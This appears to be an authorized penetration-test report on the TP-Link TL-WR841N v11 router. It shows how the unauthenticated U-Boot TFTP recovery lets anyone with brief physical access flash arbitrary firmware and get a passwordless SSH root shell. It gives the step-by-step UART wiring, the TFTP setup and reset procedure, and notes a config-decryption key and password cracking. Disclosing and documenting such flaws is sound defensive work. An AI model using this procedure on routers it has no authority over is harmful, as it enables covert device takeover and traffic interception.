# TP-Link TL-WR841N v11 — U-Boot TFTP Recovery Arbitrary Firmware Flash

**Report Type:** Proof-of-Concept — IoT Hardware Security Assessment

**Date:** September 10, 2026

**Classification:** Confidential — Authorized Testing Only

---

## Executive Summary

This report proves that anyone with **physical access** to a TP-Link TL-WR841N v11 Wi-Fi router can completely take over the device: install their own software, read and change its settings, and use it as a hidden foothold inside the network. The takeover requires **no password, no software exploit, and no special equipment** beyond a small serial cable (about US$3) and a laptop.

The root cause is that the router's built-in "recovery mode" (a factory feature meant to let owners restore a broken router) is completely **unprotected**. When the router is switched on with the back-panel reset button held down, it will happily download and install whatever software it is told to fetch, with no check on who sent it or whether it is genuine.

**What an attacker can do once they take over the router:**
- View, record, or redirect internet traffic that flows through it (passwords, financial logins, private data).
- Reset it to run a "fake" Wi-Fi network that looks normal but harms users.
- Brick the device (make it permanently unusable) as a nuisance or as part of a sabotage.
- Use the device as a pivot point to attack other computers on the network.

**How realistic is this risk?** The attack needs someone to be physically present at the device (roughly one minute of unsupervised access). It is therefore a targeted, deliberate attack, not something that spreads automatically across the internet. Industry scoring tools estimate the probability of this being exploited in the wild within 30 days at roughly **0.05%–0.40%** (low), but that does not change the fact that the consequence, full control of a network device, is **Critical**.

**What should you do?** The vendor no longer supports this model, so the durable fix is to **replace the device**. If it must stay in service, keep it in a physically secured location (locked room / cabinet), segment it away from sensitive systems, and do not rely on it as a security boundary.

**CVSS 4.0:** 8.6 (Critical)

**ISVS Level:** L2/L3 non-conformance (V3.1.1, V5.1.1)

---

## Plain-Language Summary (For Non-Technical Readers)

*If you only read one part of this report, read this.*

**The finding in one sentence:** A TP-Link TL-WR841N v11 wireless router can be fully taken over by an attacker who briefly touches the device, using only a $3 wire and a laptop. No passwords, no hacking skills, and no marks left behind.

**The finding in more detail:** Routers include a maintenance mode intended for owners who accidentally break their router. In this model, that maintenance mode is left wide open. An attacker who presses the reset button while powering the router on causes it to "ask" the network for software to install, and it installs whatever it receives without checking who sent it. The attacker serves up their own (malicious) software, the router installs it, and the attacker gains complete control ("administrator access") over the device from that point on.

**Why this matters to a business:**
1. **Physical access is the only requirement.** Most security controls stop *remote* attacks. They do nothing against someone who can spend a minute alone with a device. A router in a reception area, an unlocked cabinet, or a messy server room is covered by this finding.
2. **The damage is invisible and persistent.** After the takeover the device looks, and mostly works, normally. It continues to route Wi-Fi and internet traffic, but the attacker controls it. This is a classic place to put a backdoor that no firewall or antivirus will detect.
3. **It is a one-time cost for the attacker.** Our test performed the whole takeover (setup, transfer, installation, and proof of control) in well under ten minutes.

**What you should do (in order of priority):**
1. **Replace** this router model, ideally with a current-model device that still receives security updates. This is the only complete fix.
2. If it cannot be replaced immediately, **physically control access** to the device (locked enclosure, tamper-evident seal, restricted rooms).
3. Do **not** treat this router as a security boundary. Assume anything behind it can be reached.
4. If the model is used at scale across the business, plan a phased replacement and track it like any other high-risk asset.

**Technical summary for engineers and auditors (one paragraph):** U-Boot 1.1.4 exposes an unauthenticated TFTP recovery path ("web_recovery"-style `is_auto_upload_firmware` flag set by the factory-reset button). No boot password, no image signing, no secure boot, no anti-rollback. Proof: 3,932,160-byte LEDE 17.01.4 factory image transferred via TFTP from 192.168.0.66, flashed to flash offset 0x9f020000, followed by SSH root shell (uid=0) confirmation on 192.168.1.1. Full technical detail in Sections 4–6.

---

## 1. Target Information

| Field | Value |
|-------|-------|
| **Manufacturer** | TP-Link Technologies Co., Ltd. |
| **Model** | TL-WR841N |
| **Hardware Version** | v11.0 |
| **Serial Number** | `2167895011070 EU/11.0` |
| **FCC ID** | **TE7WR841NXV11** (printed on rear label) |
| **IC (ISED, Canada)** | **8853A-WR841NXV11** (label transcription `8853A-WR841NX`) |
| **Certification** | FCC ID + IC printed on rear label; CE marking on PCB silkscreen |
| **SoC** | Qualcomm QCA9533-BL3A (MIPS 24Kc, 650 MHz per boot log; marking "PE625J2Y 1625 TAIWAN") |
| **Flash** | GigaDevice GD25Q32 (4MB SPI NOR, JEDEC `c8 40 16`) |
| **DRAM** | Zentel A3S56D40GTP-50L (32MB SDRAM; confirmed via chip marking + external cross-reference) |
| **Bootloader** | U-Boot 1.1.4 (Mar 25 2016) |
| **Stock Firmware** | TP-Link TL-WR841N v11 160325 (Linux 2.6.31) |
| **Test Firmware** | LEDE 17.01.4 (Linux 4.4.92, r3560-79f57e422d) |
| **Ethernet Switch** | Qualcomm S27 (LAN: eth0/GMAC0, WAN: eth1/GMAC1) |
| **WiFi** | 2.4GHz 802.11n (300 Mbps, radio0); default SSID `TP-LINK_05C6` (last 4 hex of label MAC) |
| **MAC Address (label)** | 98-DE-D0-D4-05-C6; factory MAC printed on rear label; base for default SSID |
| **MAC Address (U-Boot env)** | ba:be:fa:ce:08:41; placeholder MAC used by U-Boot for eth0/eth1 (differs from label MAC; SSID derives from label MAC) |
| **Power Supply** | 9 V DC, 0.6 A (label: 9V ≈ 0.6A) |
| **Default Access** | http://tplinkwifi.net → 192.168.0.1, admin/admin (default credentials) |
| **LAN IP (stock)** | 192.168.0.1/24 |
| **LAN IP (OpenWrt)** | 192.168.1.1/24 (br-lan) |

### Hardware Topology

```
                    ┌─────────────────────────────┐
                    │     TP-Link TL-WR841N v11    │
                    │                               │
  WAN Port ────────│── eth1 (GMAC1, VLAN-isolated) │
                    │                               │
  LAN Port 1 ──────│──┐                            │
  LAN Port 2 ──────│──┤ S27 Switch (eth0/GMAC0)    │
  LAN Port 3 ──────│──┤        │                    │
  LAN Port 4 ──────│──┘        ▼                    │
                    │        br-lan (192.168.0.1)   │
                    │                               │
  Serial (UART) ───│── TX/RX/GND (115200 8N1)      │
                    │         ▲                     │
  Reset Button ────│── GPIO   │                     │
                    │         │                     │
  Power ───────────│── 9V DC  │                     │
                    └─────────┼─────────────────────┘
                              │
                    ┌─────────┴─────────┐
                    │   CP2102 USB-UART  │
                    │   (Host: /dev/     │
                    │    ttyUSB0)        │
                    └───────────────────┘
```

---

## 1.1 Physical Reconnaissance

### 1.1.1 Unit Identification — Back / Specification Sticker

The device's information sticker on the underside of the case is the primary source of unit identification. It carries the model name (TL-WR841N), hardware version (v11), full FCC ID (**TE7WR841NXV11**), IC number (**8853A-WR841NX**, canonical ISED form `8853A-WR841NXV11`), power rating (9 V ≈ 0.6 A), default-access details (http://tplinkwifi.net → 192.168.0.1, admin/admin), serial number, factory MAC (**98-DE-D0-D4-05-C6**), default wireless password/PIN (`01714098`), and default SSID (`TP-LINK_05C6`, derived from the last four hex digits of the label MAC).

![router_back_sticker](images/router_back_sticker.jpg)
> *Under-casing specification sticker. Full label shown: FCC ID, IC, model, hardware version, power rating, serial number, factory MAC, default access, and wireless password/PIN.*

The FCC ID is directly queryable in the **FCC OET authorization database** (`https://fcc.report` / `https://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm`) using `TE7WR841NXV11`, and the IC in the ISED (Innovation, Science and Economic Development Canada) database using `8853A-WR841NXV11`. Verification performed 2026-09-10 confirms the grant: **TP-Link Technologies Co., Ltd.**, application `WR841NXV11`, sold as a "300Mbps Wireless N Router", DTS (Digital Transmission System, 2412–2462 MHz), **granted 2015-11-25**, test firm Bureau Veritas (Taoyuan). The FCC application data independently confirms the platform (QCA9533, 2.4 GHz 802.11n) and hardware revision of the unit under test. These certification identifiers are regulatory public records, not secret material, but they give a third-party enumerator an independent confirmation of the exact product (platform, radio, hardware revision) that matches the sticker and the PCB silkscreen markings. CE marking also appears on the PCB silkscreen alongside the FCC/IC numbers.

Note: the **factory MAC on the label (98-DE-D0-D4-05-C6)** differs from the MAC U-Boot uses at runtime for eth0/eth1 (`ba:be:fa:ce:08:41`). The default SSID is derived from the *label* MAC, indicating the label MAC is the authoritative factory value; the U-Boot value is a placeholder assigned in the bootloader environment. The label also confirms the well-known default admin credentials (admin/admin), which the stock firmware leaves active.

### 1.1.2 Exterior Ports & Indicators (Front/Rear Panels)

![ports_panel](images/ports_panel.jpg)
> *Exterior ports and controls. Callouts:*

| Port / Control | Type | Notes |
|----------------|------|-------|
| **ON/OFF** | Rocker power switch | Puts the device in standby; does NOT cut 9 V supply |
| **POWER** | Barrel DC jack | 9 V DC, 0.6 A (matching label power rating) |
| **WAN** | 10/100 Ethernet (RJ-45) | WAN uplink (GMAC1/eth1) |
| **LAN 1–4** | 10/100 Ethernet (RJ-45) | LAN ports over the internal S27 switch (GMAC0/eth0) |
| **WPS/RESET** | Tactile button | Factory-reset / WiFi-protected-setup. Long-press during power-on sets `is_auto_upload_firmware=1` → U-Boot TFTP recovery |
| **WIFI ON/OFF** | Slide switch | Radio enable/disable (hardware kill switch) |

### 1.1.3 Printed Circuit Board — Component Walkthrough

Board base, top surface, shield cans removed/reflected where present (teardown photographed from both ends; UART header pins on left/right of frame):

![pcb_annotated](images/pcb_annotated.jpg)
> *Base PCB after teardown, two angles with component callouts. Annotated highlights:*

| Callout | Component | Silkscreen / Marking | Notes |
|---------|-----------|----------------------|-------|
| **1** | QCA9533 SoC | `QCA9533-BL3A` `PE625J2Y` `1625` `TAIWAN` | Main CPU, MIPS 24Kc @ 650 MHz; GMAC0/GMAC1 + USB + SDRAM controller on-die |
| **2** | GigaDevice flash + DRAM | GigaDevice ICs (marking not legible in photo), Zentel A3S56D40GTP-50L | 4 MB SPI NOR flash (GD25Q32, JEDEC `c8 40 16` confirmed at boot) + 32 MB SDRAM (matches boot `DRAM: 32 MB`) |
| **3** | UART header | 3-pin, 3 signals | Debug console. Pin order bottom→top: TX, RX, GND (3.3 V TTL), exposed on PCB edge |
| **4** | Reset button | — | Recessed, rear panel. Long-press during power-on sets `is_auto_upload_firmware=1` |
| **5** | WiFi radio + 2.4 GHz RF section | QCA9533 integrated radio | Printed antenna feed to two external sticks |
| **6** | S27 Ethernet switch block | Integral to QCA9533 | LAN ports via transformer, WAN uses GMAC1 |
| **7** | DC input + regulators | — | 9 V feed, 3.3 V/1.8 V rail generation |

The UART header is left populated on the production board: no depopulation, no solder-mask silkscreen removal, and no soldering required for an attacker (pins are exposed through holes).

### 1.1.4 UART Hook-Up (No-Solder Method)

![uart_cp2102_hooked](images/uart_cp2102_hooked.jpg)
> *CP2102 USB-UART adapter leaned against the exposed UART pins, held in place by friction; no soldering was performed.*

Connect as follows. **The CP2102 is not soldered**; the header pins are long enough that the adapter's female jumper leads grip the pins by friction alone during the whole test:

| CP2102 (USB-UART) | Router UART header (bottom→top: TX, RX, GND) |
|-------------------|---------------------------------------------|
| TXD | RX pin (middle) |
| RXD | TX pin (bottom) |
| GND | GND pin (top) |
| 3V3 / VCC | **NOT CONNECTED** (router self-powered) |

Board runs at 3.3 V TTL levels, which matches the CP2102 natively; no level shifter is required.

---

## 2. Software Bill of Materials (SBOM)

> **Component inventory generated with mithril v0.1.3** (secrets/SBOM/CVE pass, offline) against the image tree unpacked by moria v0.1.0. Cross-checked against UART boot banners and stock-firmware extraction.

| Component | Version | Build Date | Notes |
|-----------|---------|------------|-------|
| **U-Boot** | 1.1.4 | Mar 25 2016 | No boot password, no secure boot, no FIT signature |
| **Linux Kernel (stock)** | 2.6.31 | — | TP-Link patched, MIPS 24Kc |
| **Linux Kernel (LEDE)** | 4.4.92 | — | OpenWrt LEDE 17.01.4 |
| **BusyBox (stock)** | 1.01 | — | Minimal shell utilities |
| **BusyBox (LEDE)** | 1.25.1 | — | Full-featured |
| **Dropbear SSH (LEDE)** | 2017.75 (LEDE 17.01.4 package) | — | Restricted to legacy SHA-1 KEX (group14-sha1/group1-sha1); requires KEX overrides on OpenSSH 10.x |
| **Flash Chip** | GD25Q32 (GigaDevice) | — | 4MB SPI NOR, 32Mbit |
| **DRAM** | A3S56D40GTP-50L (Zentel) | — | 32MB SDRAM |
| **Ethernet Switch** | Qualcomm S27 | — | Built into QCA9533 SoC |

### Firmware Signing: **NONE**
### Secure Boot: **NOT IMPLEMENTED**
### Boot Password: **NOT SET** (U-Boot `bootdelay=1`, autoboot proceeds without authentication)
### Rollback Protection: **NONE**

---

## 3. Test Equipment & Tooling

### 3.1 Hardware

| Item | Details |
|------|---------|
| **Target Device** | TP-Link TL-WR841N v11 (stock firmware 160325) |
| **Serial Adapter** | CP2102 USB-to-UART (3.3 V TTL), no level shifter required |
| **Host System** | Kali Linux (VMware Workstation 17.5) |
| **VM Networking** | libvirt bridged (virbr0): eno1 + vnet2, host-side `ip link set eno1 master virbr0` |
| **Cabling** | Direct Ethernet host↔router (any wired port; the captured recovery ran over eth0/enet0 port4); LAN for SSH post-flash |

### 3.2 Software Tooling

| Tool | Version / Method | Purpose |
|------|------------------|---------|
| **atftpd** | advanced TFTP daemon | Serve `wr841nv11_tp_recovery.bin` on `192.168.0.66:69` during recovery |
| **stty + `exec 3<>`** | coreutils file-descriptor I/O | UART read path that worked (pyserial returned 0 bytes on this adapter) |
| **OpenSSH client** | 10.4p1 | SSH to LEDE with legacy KEX flags |
| **xxd / sha1sum** | coreutils | Verify TP-Link header magic (`01000000`) + firmware digest |
| **ss / bridge / ip** | iproute2 | Service/port and bridge-state verification (`bridge link show virbr0`) |
| **binwalk** | firmware analysis | Image identification, filesystem carving (stock + LEDE) |
| **strings** | GNU binutils | Binary/string hunt across U-Boot and stock binaries |
| **Ghidra** | NSA reverse-engineering | Decompilation of `libcmm.so`, DES key + `util_execSystem` analysis |
| **OpenSSL** | `enc -d -des-ecb` | Config-XML decryption (key `478DA50FF9E3D2CB`) |
| **hashcat** | password cracker | Stock firmware root hash `$1$GTN.gpri$...` → `admin:admin` |
| **CyberChef** | web tool | Secondary config-XML decryption confirmation |
| **JTAGulator / baudrate.py** (referenced) | hardware probing | UART/baud identification methodology (ISTG `INFO-001`) |
| **pyserial** | python serial | Tested for UART I/O; returned 0 bytes, superseded by `stty` FD | 
| **moria** v0.1.0 | https://github.com/nmatt0/moria | IoT firmware identification & extraction (binwalk-class). Identifies/unpacks filesystems (SquashFS, JFFS2, UBIFS, ext, …), U-Boot uImage/FIT, archives; `-e` extracts, `-E` entropy. Used to map the stock+LEDE images, `--extract` → rooted tree for mithril |
| **mithril** v0.1.3 | https://github.com/nmatt0/mithril | IoT static scanner: secrets, SBOM (CycloneDX/SPDX), CVEs (OSV+NVD mirror annotated w/ CISA KEV + EPSS), licenses. Used for the SBOM in §2 and to cross-check component versions/CVEs offline |
| **PoC driver (current)** | `pwn-router.sh` | Unified driver: `exploit:*` subcommands cover the base attack chain (UART → TFTP recovery → SSH root — §4–§8, Appendix C), `doom:*` subcommands cover the §10 payload deployment. SSH-multiplexed, poll-based, size-verified, with a watchdog supervisor + auto-recovery. Supersedes the original 12-step PoC. |
| **PoC driver (original, preserved)** | `docs/legacy-scripts/tplink_wr841n_v11_root_shell_poc.sh` | Original 12-step attack automation, kept verbatim for provenance: UART wiring check → board fingerprint → firmware staging → network setup → TFTP serve → recovery trigger → flash verification → SSH root → on-router enumeration → proof of root → optional stock revert. Companion analysis pipeline: `moria -e firmware.bin` → `mithril firmware.bin.extracted/`. Superseded in-session by `pwn-router.sh`. Supersedes earlier scratch scripts (`boot_interrupt.py`, `uart_bruteforce.py`, `ps_log.py`, `cve_test.py`, `cve_test_v2.py`, `pack_fw.sh`). |

---

## 4. Attack Vector Description

### 4.0 CVE Scouting — Web Attack Surface (Evaluated, Not Chosen)

Before the hardware path, the stock web interface was probed against the known public CVE set for the WR841N family (`cve_test.py`, `cve_test_v2.py`). The results explain why the U-Boot TFTP path was selected as the winning vector:

| CVE | Affects v11 | Type | Our Finding |
|-----|------------|------|-------------|
| **CVE-2022-30024** | Yes (160325 exact) | Auth RCE: buffer overflow in httpd (Wi-Fi System Tools page) | Testable but **requires authentication**; relies on web daemon bug |
| **CVE-2018-12577** | Yes | Auth command injection via ping/traceroute diagnostics | Requires login + working diagnostics; character escaping observed on SSID inputs |
| **CVE-2018-12575** | Yes | Auth bypass via Referer header | Referer prefix check (`strncmp`) is weak; usable for XSRF-style flows |
| **CVE-2025-53711..53715** | v11-era, 2026 disclosure | Buffer overflow in `.htm` pages (WlanNetworkRpm, Wan6to4TunnelCfg) | DoS only; crashes httpd, no RCE |
| **CVE-2025-6151** | v11-era | `WanSlaacCfgRpm.htm` buffer overflow | DoS only |
| **CVE-2019-17147** | v14 (port-checked on v11) | Host header stack overflow | Not reproducible on v11; v14 feature |
| **CVE-2023-39471** | v14 (UDP 20002) | `ated_tp` command injection | Not reproducible on v11; v14 feature |
| **CVE-2018-15700 / 15701** | Yes | httpd DoS via Referer / Cookie header | DoS only; crashes the portal, no control |
| **CVE-2018-15702** | Yes | XSRF via incomplete Referer check | Low impact; CSRF on admin UI, chained with auth only |

The web path was set aside because the sole RCE candidate (CVE-2022-30024) demands authenticated access and depends on httpd behavior; the remaining candidates are DoS or v14-only. The hardware path (U-Boot TFTP recovery) yields the same endpoint, root, **without any authentication and without writing to the web attack surface**. It is also model-specific and survives firmware updates on the device (U-Boot is never re-flashed by web updates).

### 4.1 Root Cause Analysis

The TL-WR841N v11 uses U-Boot 1.1.4 as its bootloader. This version has several critical security deficiencies:

1. **No boot password**: the autoboot delay (`bootdelay=1`) allows interruption via UART without authentication
2. **No firmware signing**: U-Boot accepts any binary image without cryptographic verification
3. **No secure boot chain**: no root of trust, no FIT signature, no signed boot stages
4. **TFTP recovery enabled by default**: the `is_auto_upload_firmware` flag activates TFTP recovery when factory reset is triggered
5. **Factory reset via physical button**: holding the reset button during power-on sets `is_auto_upload_firmware=1`, enabling the TFTP recovery path

### 4.2 U-Boot TFTP Recovery Mechanism

When the device enters recovery mode (via factory reset), U-Boot executes the following sequence:

```
1. Check is_auto_upload_firmware flag (set by factory reset)
2. If flag == 1:
   a. Bring up the wired Ethernet interface that has a live link
      (in the captured successful run: eth0 / enet0 port4; U-Boot
       initializes both eth0 and eth1 and uses whichever is up)
   b. Set client IP: 192.168.0.86
   c. Set server IP: 192.168.0.66
   d. Set filename: wr841nv11_tp_recovery.bin
   e. Initialize TFTP client
   f. Request file from server via UDP port 69
   g. Receive firmware image (no signature check)
   h. Erase flash sectors (write addr 0x9f020000, 60 × 64 KB sectors)
   i. Write received image to flash
   j. Verify: product id verify sucess
   k. Reboot into new firmware
```

The firmware image is accepted without any cryptographic verification. The only check is the product ID match (`wr841nv11_tp_recovery.bin` filename convention), which is trivially spoofed.

### 4.3 Network Topology (Attack Setup)

```
┌─────────────────────────────────────────────────────────────────┐
│                        ATTACK NETWORK                           │
│                                                                  │
│  ┌──────────────┐     ┌──────────────┐     ┌──────────────┐    │
│  │  Kali Linux  │     │  virbr0      │     │  TL-WR841N   │    │
│  │  VM          │     │  Bridge      │     │  v11         │    │
│  │              │     │              │     │              │    │
│  │  192.168.0.66│◄────│── eno1 ──────│◄────│  Ethernet    │    │
│  │  (TFTP Srv)  │     │  (bridged)   │     │  port        │    │
│  │              │     │              │     │  192.168.0.86│    │
│  │              │     │              │     │              │    │
│  │  /dev/ttyUSB0│◄────│── CP2102 ────│◄────│  UART TX/RX  │    │
│  │  (Serial)    │     │  USB-UART    │     │  115200 8N1  │    │
│  └──────────────┘     └──────────────┘     └──────────────┘    │
│                                                                  │
│  Note: U-Boot uses whichever wired interface has a live link. In the   │
│  captured successful run the link came up on eth0 (enet0 port4) and    │
│  TFTP ran over eth0. Earlier attempts saw eth1 probed as well. A       │
│  direct Ethernet connection host↔router is sufficient on either port.  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 5. Step-by-Step Proof of Concept

### 5.1 UART Wiring & Board Fingerprinting

**Goal:** establish serial console access and identify the hardware.

**Wiring:**
| CP2102 Pin | Board Pin | Notes |
|------------|-----------|-------|
| TXD | RX | 3.3V TTL |
| RXD | TX | 3.3V TTL |
| GND | GND | Common ground |
| 3V3 | — | NOT connected (board powered externally) |

**Board Fingerprint (from UART boot log):**

```
U-Boot 1.1.4 (Mar 25 2016 - 16:59:35)

ap143-2.0 - Honey Bee 2.0

DRAM:  32 MB
Flash Manuf Id 0xc8, DeviceId0 0x40, DeviceId1 0x16
flash size 4MB, sector count = 64
Flash:  4 MB
Using default environment

In:    serial
Out:   serial
Err:   serial
Net:   ath_gmac_enet_initialize...
...
eth0: ba:be:fa:ce:08:41
...
eth1: ba:be:fa:ce:08:41
```

**Key Identifiers:**
- Board: `ap143-2.0` "Honey Bee 2.0" (Qualcomm reference design)
- SoC: QCA9533 (MIPS 24Kc, 650 MHz per kernel clock line)
- Flash: GigaDevice GD25Q32 (4MB SPI NOR, JEDEC `0xc8 0x40 0x16`)
- DRAM: 32 MB (Zentel A3S56D40GTP-50L)

### 5.2 Firmware Preparation

**Step:** obtain and stage the replacement firmware.

```bash
# LEDE 17.01.4 factory image (must match hardware version)
wget https://downloads.openwrt.org/releases/17.01.4/targets/ar71xx/generic/lede-17.01.4-ar71xx-generic-tl-wr841-v11-squashfs-factory.bin

# Verify file size (must be exactly 3,932,160 bytes for TFTP recovery)
ls -la lede-17.01.4-ar71xx-generic-tl-wr841-v11-squashfs-factory.bin
# -rw-r--r-- 1 user user 3932160 Sep 10 14:22 lede-17.01.4-ar71xx-generic-tl-wr841-v11-squashfs-factory.bin

# Stage for TFTP (filename MUST be wr841nv11_tp_recovery.bin)
cp lede-17.01.4-ar71xx-generic-tl-wr841-v11-squashfs-factory.bin /tmp/tftp/wr841nv11_tp_recovery.bin

# SHA1 verification
sha1sum /tmp/tftp/wr841nv11_tp_recovery.bin
# 83daf437883b0c79d89324de8906790931ba275f
```

### 5.3 Network Setup (Bridged VM)

**Step:** connect the Kali VM to the same Layer-2 network as the router's wired Ethernet port used during recovery. U-Boot will TFTP over whichever wired port has a live link; a direct cable to any router Ethernet port works.

```bash
# On Kali host: configure TFTP server IP
sudo ip addr add 192.168.0.66/24 dev eno1
sudo ip link set eno1 up

# Verify bridging (libvirt must enslave eno1 to virbr0)
bridge link show virbr0
# eno1: <BROADCAST,MULTICAST,UP> master virbr0 state forwarding priority 1
# vnet2: <BROADCAST,MULTICAST,UP> master virbr0 state forwarding priority 1

# Both eno1 and vnet2 must be listed as master virbr0
# If eno1 is NOT enslaved:
sudo ip link set eno1 master virbr0
```

**Critical:** In libvirt "bridged" mode, the physical NIC (eno1) is NOT automatically enslaved to virbr0. Manual intervention is required.

### 5.4 TFTP Server Configuration

**Step:** set up a TFTP server to serve the firmware image.

```bash
# Install and start atftpd
sudo apt install atftpd

# Kill existing atftpd if running
sudo killall atftpd 2>/dev/null

# Start atftpd bound to 192.168.0.66 (the IP the router expects)
sudo atftpd --daemon --bind-address 192.168.0.66 --port 69 /tmp/tftp

# Verify server is listening
sudo ss -ulnp | grep 69
# UNCONN  0  0  192.168.0.66:69  0.0.0.0:*

# Verify file is served correctly
ls -la /tmp/tftp/wr841nv11_tp_recovery.bin
# -rw-r--r-- 1 user user 3932160 Sep 10 14:22 wr841nv11_tp_recovery.bin
```

### 5.5 Recovery Trigger (Reset Button Procedure)

**Step:** trigger U-Boot TFTP recovery mode.

**Procedure:**
1. Power off the router (unplug DC adapter)
2. Press and hold the reset button (rear panel)
3. While holding reset, plug in the DC adapter
4. Continue holding reset for 8-10 seconds after power-on
5. Release reset button
6. Monitor UART output for TFTP transfer

**Expected UART output during recovery:**

```
is_auto_upload_firmware=1
eth1 link down
enet0 port4 up
dup 1 speed 100
Using eth0 device
TFTP from server 192.168.0.66; our IP address is 192.168.0.86
Filename 'wr841nv11_tp_recovery.bin'.
Load address: 0x80800000
Loading: *T #################################################################
	 #################################################################
	 ...
	 ######################################################
done
Bytes transferred = 3932160 (3c0000 hex)
Firmware recovery: product id verify sucess!
Firmware recovery: filesize = 0x3c0000.
Erasing flash... 
First 0x2 last 0x3d sector size 0x10000
	 ... 60
Erased 60 sectors
Copy to Flash... write addr: 9f020000
done
U-Boot 1.1.4 (Mar 25 2016 - 16:59:35)
...
is_auto_upload_firmware=0
Autobooting in 1 seconds
## Booting image at 9f020000 ...
```

**Evidence:**
- `Bytes transferred = 3932160 (3c0000 hex)`: full firmware received (3 MB)
- `Firmware recovery: product id verify sucess!`: product ID matched, no cryptographic check
- `Erased 60 sectors`: flash erased (60 × 64 KB = 3,932,160 bytes)
- `Copy to Flash... write addr: 9f020000`: image written to flash
- Recovery downloads over **eth0** (the LAN switch, `enet0 port4 up`) in the captured run; eth1/WAN was down at that moment. U-Boot uses whichever wired interface has a live link.

### 5.6 Flash Verification

**Step:** confirm the firmware was written correctly.

After the TFTP transfer completes, U-Boot automatically reboots. The new firmware (LEDE 17.01.4) boots:

```
U-Boot SPL applied
...
Linux version 4.4.92 (buildbot@builds-02.infra.lede-project.org) (gcc version 5.4.0
  (LEDE GCC 5.4.0 r3101-bce140e) ) #0 Tue Oct 17 14:59:45 2017

Bootargs: board=TL-WR841N-v11 console=ttyS0,115200 rootfstype=squashfs,jffs2 noinitrd
...
VFS: Mounted root (squashfs filesystem) readonly on device 31:2.
...
Please press Enter to activate this console.
```

**Key verification points:**
- Linux kernel version changed from 2.6.31 (stock) to 4.4.92 (LEDE)
- Root filesystem mounted read-only (squashfs)
- Serial console available on ttyS0

### 5.7 Post-Flash Access (SSH with Legacy KEX)

**Goal:** establish an SSH root session on the compromised device.

LEDE 17.01.4's Dropbear SSH server only offers legacy key exchange algorithms, which modern OpenSSH clients (10.x) reject by default. The following workaround is required:

```bash
ssh -o KexAlgorithms=diffie-hellman-group14-sha1 \
    -o HostKeyAlgorithms=ssh-rsa \
    -o Ciphers=aes128-ctr \
    -o MACs=hmac-sha1 \
    -o StrictHostKeyChecking=no \
    root@192.168.1.1
# Password: <empty> (just press Enter)
```

**Alternative: set global SSH config** (`~/.ssh/config`):

```
Host 192.168.1.1
    KexAlgorithms diffie-hellman-group14-sha1
    HostKeyAlgorithms ssh-rsa
    Ciphers aes128-ctr
    MACs hmac-sha1
    StrictHostKeyChecking no
```

During testing the LEDE 17.01.4 Dropbear instance only negotiated the legacy SHA-1 key-exchange groups (`diffie-hellman-group14-sha1`, `diffie-hellman-group1-sha1`). Modern OpenSSH clients (9.x/10.x) no longer enable these by default; they prefer `curve25519-sha256` / `ecdh-sha2-nistp256`, so the algorithms have to be forced on the command line. The SSH server itself had no password set for root, which is why login succeeded with an empty password.

### 5.8 Root Shell Confirmation

**Step:** demonstrate full root access and device control.

```bash
# Verify root identity
id
# uid=0(root) gid=0(root)

# Verify hostname
cat /etc/openwrt_release
# DISTRIB_ID='LEDE'
# DISTRIB_RELEASE='17.01.4'
# DISTRIB_REVISION='r3560-79f57e422d'
# DISTRIB_TARGET='ar71xx/generic'
# DISTRIB_DESCRIPTION='LEDE Reboot 17.01.4 r3560-79f57e422d'
# DISTRIB_TAINTS='no-all'

# Verify kernel version
uname -a
# Linux LEDE 4.4.92 #0 Tue Oct 17 14:59:45 2017 MIPS 24Kc MIPS

# Verify network configuration
ip addr show br-lan
# 3: br-lan: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
#     inet 192.168.1.1/24 brd 192.168.1.255 scope global br-lan

# Verify WiFi
uci show wireless
# wireless.radio0.disabled='0'
# wireless.radio0.ssid='LEDE'

# Verify firewall (WAN input rejected, LAN accepted)
iptables -L zone_wan_input -n
# Chain zone_wan_input (1 references)
# target   prot opt in     out     source    destination
# REJECT   all  --  *      *       0.0.0.0/0 0.0.0.0/0  reject-with icmp-port-unreachable

# Verify no password set on root
cat /etc/shadow | grep root
# root::0:0:99999:7:::

# Demonstrate persistent access (survives reboot)
reboot
# ...wait for reboot...
ssh -o KexAlgorithms=diffie-hellman-group14-sha1 \
    -o HostKeyAlgorithms=ssh-rsa \
    -o Ciphers=aes128-ctr \
    -o MACs=hmac-sha1 \
    root@192.168.1.1
# Still works (root shell persists)
```

---

## 6. Evidence

### 6.1 UART Boot Capture (Stock Firmware)

**Source:** `/tmp/uart_bridge.txt` (reset-hold cycle, lines 28–96)

```
U-Boot 1.1.4 (Mar 25 2016 - 16:59:35)

ap143-2.0 - Honey Bee 2.0

DRAM:  32 MB
Flash Manuf Id 0xc8, DeviceId0 0x40, DeviceId1 0x16
flash size 4MB, sector count = 64
Flash:  4 MB
Using default environment

In:    serial
Out:   serial
Err:   serial
Net:   ath_gmac_enet_initialize...
...
```

### 6.2 UART Boot Capture (Recovery Mode)

**Source:** `/tmp/uart_bridge.txt` lines 67–96. *(Note: `recovery_try2.txt` / `recovery_try3.txt` are stock-firmware boot logs and were NOT the recovery runs; the recovery trace below is the reset-hold cycle captured in `uart_bridge.txt`.)*

```
is_auto_upload_firmware=1
eth1 link down
enet0 port4 up
dup 1 speed 100
Using eth0 device
TFTP from server 192.168.0.66; our IP address is 192.168.0.86
Filename 'wr841nv11_tp_recovery.bin'.
Load address: 0x80800000
Loading: *T #################################################################
	 #################################################################
	 ...
	 ######################################################
done
Bytes transferred = 3932160 (3c0000 hex)
Firmware recovery: product id verify sucess!
Firmware recovery: filesize = 0x3c0000.
Erasing flash... 
First 0x2 last 0x3d sector size 0x10000
	 ... 60
Erased 60 sectors
Copy to Flash... write addr: 9f020000
done
```

### 6.3 TFTP Transfer Log (atftpd)

**Source:** atftpd daemon output

```
TFTP: Sending file "wr841nv11_tp_recovery.bin" to 192.168.0.86
TFTP: Transfer complete: 3932160 bytes
```

### 6.4 SSH Session Transcript

**Source:** Direct session capture

```
$ ssh -o KexAlgorithms=diffie-hellman-group14-sha1 \
      -o HostKeyAlgorithms=ssh-rsa \
      -o Ciphers=aes128-ctr \
      -o MACs=hmac-sha1 \
      root@192.168.1.1

root@192.168.1.1's password:
(root login, empty password)

root@LEDE:~# id
uid=0(root) gid=0(root)

root@LEDE:~# cat /etc/openwrt_release
DISTRIB_ID='LEDE'
DISTRIB_RELEASE='17.01.4'
DISTRIB_REVISION='r3560-79f57e422d'
DISTRIB_TARGET='ar71xx/generic'
```

### 6.5 LEDE Serial Console — Interactive UART Shell

